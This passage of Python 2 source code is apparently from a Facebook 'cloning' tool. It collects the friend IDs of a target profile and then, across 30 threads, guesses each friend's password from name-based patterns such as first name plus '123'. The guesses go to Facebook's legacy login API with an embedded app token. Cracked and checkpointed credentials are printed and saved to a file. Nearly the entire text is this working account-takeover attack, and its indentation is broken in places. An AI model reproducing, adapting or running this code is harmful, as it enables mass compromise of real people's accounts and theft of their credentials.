		print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
			black()
		print"\033[1;91mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        elif peak =="2":
	        os.system('xdg-open https://chat.whatsapp.com/FmuKakzKRp6gpf9Xqr')
	        menu()
        elif peak =="3":
	        os.system('xdg-open https://www.youtube.com/channel/UCuUzgS7lnF7S6xnWNl9aIgg')
	        menu()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_black()
	
	print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
	jalan('\033[1;91mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
	print "\n\033[1;91mΒ«--β’ββ’β’ββ’---\x1b[1;95mβ’ββ’Stop Process Press CTRL+Zβ’ββ’\033[1;91m---β’ββ’β’ββ’-Β»"
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	
			
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:γπ΄π·ππ°ππ·π°πΌγ
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + 'david'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['first_name']+'alex'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'								
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = ('justin' + b['last_name'])									
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = ('jack' + b['last_name'])						
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'						
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = ('mark' + b['last_name'])											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'Michael'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = ('Daniel' + b['last_name'])										
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '1122'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ β ] \x1b[1;96mCheckpoint'
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;91mDEDSEC\033[1;95mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
	print "  \033[1;91mΒ«---β’ββ’---Developed By γπ΄π·ππ°ππ·π°πΌγ--β’ββ’---Β»" #Dev:γπ΄π·ππ°ππ·π°πΌγ
	print '\033[1;93mβProcess Has Been Completed Pressβ‘ Ctrl+Z.β© Next Type (0 & Data Reset)β©\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 __β β ββ_____ ββ β β ______β β ββ__
_β βββββ_ β β β β β β_ββββ β β_
ββββ_____ββ β β _βββββ_____ββ β
βββ________ β β____βββ________β β β
βββ________ ββ ___βββ________β β β
ββββ_______βββ_βββ________ β β β
__ββββ______ β βββ_________β β β__
____ββββ______ β β β ______ β β β____
_______β ββ__ββββ β β__β β β_______
__________βββββ____β β β β β__________
____________βββ________β β β____________
______________β____________β______________
         Checkpoint ID Open After 7 Days

β’\033[1;95mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.
: \033[1;91m ....γπ΄π·ππ°ππ·π°πΌγ....... \033[1;95m :
β’\033[1;95mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.' 
                WhatsApp π
              \033[1;91m +923434810071"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()
         
def mafia():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Friend List Public ID."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m2.\x1b[1;95mBlack Jerry WhatsApp Group Bangladash."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m3.\x1b[1;95mBlack Jerry Youtube Chenal."
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_mafia()

def pilih_mafia():
	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_mafia()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[β’ββ’] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			mafia()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        elif peak =="2":
	        os.system('xdg-open https://chat.whatsapp.com/FEspNY3oMSgDxo5pN')
	        menu()
        elif peak =="3":
	        os.system('xdg-open https://www.youtube.com/channel/UCuUzgS7lnF7S6xnWNl9aIgg')
	        menu()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_mafia()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97mΒ«--β’ββ’β’ββ’---\x1b[1;94mβ’ββ’Stop Process Press CTRL+Zβ’ββ’\033[1;97m---β’ββ’β’ββ’-Β»"
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	jalan(' \033[1;97m.................\033[1;94mCloning Start..\033[1;97m............ ')
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:γπ΄π·ππ°ππ·π°πΌγ
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['last_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = (b['first_name']+'1234')								
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'								
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = ('Md' + b['last_name'])											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
